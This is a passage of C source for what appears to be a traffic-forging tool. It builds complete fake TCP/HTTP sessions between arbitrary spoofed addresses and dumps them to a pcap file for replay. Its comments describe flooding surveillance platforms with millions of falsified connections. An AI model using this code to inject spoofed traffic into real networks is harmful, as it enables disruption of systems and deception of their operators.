        packet_flags = TCP_FLAG_PSH|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
        packet_ttl = 53;
        if ((bptr = BuildInstructionsNew(&build_list, server_ip, client_ip, server_port, client_port, packet_flags, packet_ttl)) == NULL) goto err;
        if (DataPrepare(&bptr->data, server_body_ptr, packet_size) != 1) goto err;
        bptr->data_size = packet_size;
        bptr->header_identifier = server_identifier++;
        bptr->ack = client_seq;
        bptr->seq = server_seq;

        server_seq += packet_size;

        // the client respondss with an ACK for that packet..
        packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
        packet_ttl = 53;
        if ((bptr = BuildInstructionsNew(&build_list, client_ip, server_ip, client_port, server_port, packet_flags, packet_ttl)) == NULL) goto err;
        bptr->header_identifier = client_identifier++;
        bptr->client = 1;
        bptr->ack = server_seq;
        bptr->seq = client_seq;

        server_size -= packet_size;
        server_body_ptr += packet_size;
    }

    // the client sends a FIN packet..
    packet_flags = TCP_FLAG_FIN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = 64;
    if ((bptr = BuildInstructionsNew(&build_list, client_ip, server_ip, client_port, server_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->client = 1;
    bptr->header_identifier = client_identifier++;
    bptr->ack = server_seq;
    bptr->seq = client_seq++;


    // the server sends back a packet ACK and FIN too
    packet_flags = TCP_FLAG_FIN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = 53;
    if ((bptr = BuildInstructionsNew(&build_list, server_ip, client_ip, server_port, client_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = server_identifier++;
    bptr->ack = client_seq;
    bptr->seq = server_seq++;

    // the client sends back an ACK for that last FIN from the server..
    packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = 64;
    if ((bptr = BuildInstructionsNew(&build_list, client_ip, server_ip, client_port, server_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->client = 1;
    bptr->header_identifier = client_identifier++;
    bptr->ack = server_seq;
    bptr->seq = client_seq;


    // set it in attack structure..
    aptr->packet_build_instructions = build_list;
    // all build instructions for packets are ready to go to low level packet generation functions..
    // ipv4/ipv6....

    // complete.. one line at a time destroying all mass surveillance.. how ya like that?
    // nsa aint ready.
    return 1;

    err:;
    aptr->completed = 1;
    return -1;
}


char *G_client_body = NULL;
char *G_server_body = NULL;
int G_client_body_size = 0;
int G_server_body_size = 0;


void *HTTP_Create(AS_attacks *aptr) {

    int i = 0;

    printf("client body %p size %d\nserver body %p size %d\n",
    G_client_body, G_client_body_size, G_server_body, G_server_body_size);
    i = GenerateBuildInstructionsHTTP(aptr,
    aptr->dst, aptr->src, aptr->destination_port, 
     G_client_body, G_client_body_size,
    G_server_body, G_server_body_size);

    printf("GenerateBuildInstructionsHTTP() = %d\n", i);

    BuildPackets(aptr);
    printf("BuildPackets() done\n");

    printf("Packet Count: %d\n", L_count((LINK *)aptr->packets));

}



#ifdef TEST

#pragma pack(push, 1)
typedef struct pcap_hdr_s {
    uint32_t magic_number;   /* magic number */
    uint16_t version_major;  /* major version number */
    uint16_t version_minor;  /* minor version number */
    int32_t  thiszone;       /* GMT to local correction */
    uint32_t sigfigs;        /* accuracy of timestamps */
    uint32_t snaplen;        /* max length of captured packets, in octets */
    uint32_t network;        /* data link type */
} pcap_hdr_t;


typedef struct pcaprec_hdr_s {
    uint32_t ts_sec;         /* timestamp seconds */
    uint32_t ts_usec;        /* timestamp microseconds */
    uint32_t incl_len;       /* number of octets of packet saved in file */
    uint32_t orig_len;       /* actual length of packet */
} pcaprec_hdr_t;

#pragma pack(pop)

int dump_pcap(char *filename, AttackOutgoingQueue *packets) {    
    AttackOutgoingQueue *ptr = packets;
    pcap_hdr_t hdr;
    pcaprec_hdr_t packet_hdr;
    FILE *fd;
    int ts = time(0);

    struct ether_header ethhdr;




    // since we are just testinng how our packet looks fromm the generator.. lets just increase usec by 1
    unsigned long usec = 0;
    char dst_mac[] = {1,2,3,4,5,6};
    char src_mac[] = {7,8,9,10,11,12};

    ethhdr.ether_type = ntohs(ETHERTYPE_IP);
    memcpy((void *)&ethhdr.ether_dhost, dst_mac, 6);
    memcpy((void *)&ethhdr.ether_dhost, src_mac, 6);
    
    

    memset((void *)&packet_hdr, 0, sizeof(pcaprec_hdr_t)); 
    memset((void *)&hdr, 0, sizeof(pcap_hdr_t));


    if ((fd = fopen(filename, "wb")) == NULL) return -1;

    
    hdr.magic_number = 0xa1b2c3d4;
    hdr.version_major = 2;
    hdr.version_minor = 4;
    hdr.sigfigs = 0;
    hdr.snaplen = 65535;
    hdr.network = 1;//layer = ethernet

    // write the global header...
    fwrite((void *)&hdr, 1, sizeof(pcap_hdr_t), fd);

    while (ptr != NULL) {

        packet_hdr.ts_sec = ts;
        packet_hdr.ts_usec++;
        //packet_hdr.ts_sec = 0;
        packet_hdr.incl_len = ptr->size + sizeof(struct ether_header); // verify it requires "octets" (multiplied by 8)
        packet_hdr.orig_len = ptr->size + sizeof(struct ether_header);

        fwrite((void *)&packet_hdr, 1, sizeof(pcaprec_hdr_t), fd);

        fwrite((void *)&ethhdr, 1, sizeof(struct ether_header), fd);
        

        fwrite((void *)ptr->buf, 1, ptr->size, fd);

        ptr = ptr->next;
    }

    fclose(fd);

    return 1;

}


char *FileContents(char *filename, int *size) {
    FILE *fd = fopen(filename,"rb");
    char *buf = NULL;
    int i;
    struct stat stv;
    if (fd == NULL) return NULL;
    fstat(fileno(fd), &stv);
    buf = (char *)calloc(1,stv.st_size + 1);

    if (buf != NULL) {
        fread(buf,stv.st_size,1,fd);
        *size = stv.st_size;
    }

    fclose(fd);

    

    return buf;
}

// lets test this system..
// lets build an http session, and write it to a pcap file.. then we can write 10,000 sessions to another capture file
// all can be replayed to the wire, and viewed in wireshark...
int main(int argc, char *argv[]) {
    int server_port, client_port;
    uint32_t server_ip, client_ip;
    int count = 1;
    int repeat_interval = 1;
    int i = 0, r = 0;

    if (argc == 1) {
        printf("%s client_ip client_port server_ip server_port client_body_file server_body_file repeat_count repeat_interval\n",
            argv[0]);
        exit(-1);
    }

    // client information
    client_ip = inet_addr(argv[1]);
    client_port =atoi(argv[2]);

    // server information
    server_ip = inet_addr(argv[3]);
    server_port = atoi(argv[4]);

    // client request data (in a file)
    G_client_body = FileContents(argv[5], &G_client_body_size);
    // server responsse data (in a file)
    G_server_body = FileContents(argv[6], &G_server_body_size);
    
    // how maany times to repeat this session on the internet?
    // it will randomize source port, etc for each..
    count = atoi(argv[7]);
    // how many seconds in between each request?
    // this is because its expecting to handling tens of thousands simul from each machine
    // millions depending on how much of an area the box will cover for disruption of the surveillance platforms
    repeat_interval = atoi(argv[8]);

    // queue this session to create an attack structure 
    r = AS_session_queue(1, client_ip, server_ip, client_port, server_port, count, repeat_interval, 1);
    // was the initial session created ok?
    printf("AS_session_queue() = %d\n", r);
        
    // what is the funtion which will create the instructions?
    // i made a quick one HTTP_Create for this test
    attack_list->function = (void *)&HTTP_Create;

    // since we are handling lots of connections in this application
    // many identities,, falsified connections,etc.. we need to process it faster than it would
    // just to queue all the packets for this first session..
    for (i = 0; i < 30; i++) {
        r = AS_perform();
        printf("AS_perform() = %d\n", r);
    }

    // how many packes are queued in the output supposed to go to the internet?
    printf("network queue: %p\n", network_queue);
    if (network_queue) {
        printf("queue size: %d\n", L_count((LINK *)network_queue));  
    }


    // now lets write to pcap file.. all of those packets.. open up wireshark.
    dump_pcap((char *)"output.pcap", network_queue);

    exit(0);
}

#endif